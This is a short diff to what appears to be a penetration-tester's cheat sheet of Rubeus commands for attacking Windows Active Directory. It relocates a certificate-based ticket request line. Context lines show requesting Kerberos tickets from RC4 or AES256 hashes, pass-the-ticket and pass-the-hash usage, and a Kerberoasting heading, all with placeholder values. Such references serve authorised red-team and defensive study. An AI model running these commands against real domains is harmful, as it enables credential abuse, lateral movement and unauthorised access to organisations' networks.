@@ -16,6 +16,7 @@ Request and load a ticket in the current session:
 ```shell!
 PS> # Load the ticket in the current session
 PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /ptt
+PS> .\Rubeus.exe asktgt /user:xxx$ /certificate:[...] /ptt
 ```
 
 Pass the hash:
@@ -34,7 +35,6 @@ PS> .\Rubeus.exe ptt /ticket:<the base64 encoded ticket>
 PS> # Pass the Key / OverPass the Hash == create a ticket
 PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /aes256:xxx /nowrap
 PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /nowrap
-PS> .\Rubeus.exe asktgt /user:xxx$ /certificate:[...] /ptt
 ```
 
 Kerberoasting
